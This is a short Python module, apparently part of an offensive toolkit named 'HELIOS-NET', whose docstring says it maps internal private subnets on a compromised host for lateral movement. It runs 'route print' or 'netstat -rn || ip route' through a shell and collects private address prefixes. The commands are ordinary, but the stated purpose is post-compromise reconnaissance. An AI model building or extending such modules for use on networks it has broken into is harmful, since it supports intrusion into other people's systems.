"""HELIOS-NET :: modules/internal/subnet_discovery.py
Internal Subnet & Routing Table Discovery Module.

Parses local or compromised host routing tables and interface configurations
to dynamically map internal private subnets for lateral movement expansion.
"""

from __future__ import annotations

import platform
import socket
import subprocess
from typing import List


def get_local_interfaces() -> List[dict]:
    """Retrieves active network interfaces and IP configurations."""
    interfaces = []
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
        interfaces.append({"interface": "primary", "ip": ip})
    except Exception:
        pass
    return interfaces


def extract_internal_subnets() -> List[str]:
    """Parses system routing tables to identify internal private CIDR prefixes."""
    subnets = []
    sys_platform = platform.system().lower()
    
    try:
        if sys_platform == "windows":
            output = subprocess.check_output("route print", shell=True, text=True, errors="ignore")
            for line in output.splitlines():
                if "192.168." in line or "10." in line or "172." in line:
                    parts = line.strip().split()
                    if parts:
                        subnets.append(parts[0])
        else:
            output = subprocess.check_output("netstat -rn || ip route", shell=True, text=True, errors="ignore")
            for line in output.splitlines():
                if "192.168" in line or "10." in line or "172." in line:
                    parts = line.strip().split()
                    if parts:
                        subnets.append(parts[0])
    except Exception:
        pass

    # Fallback to standard private prefix if nothing parsed
    if not subnets:
        subnets.append("192.168.1.")

    return list(set(subnets))
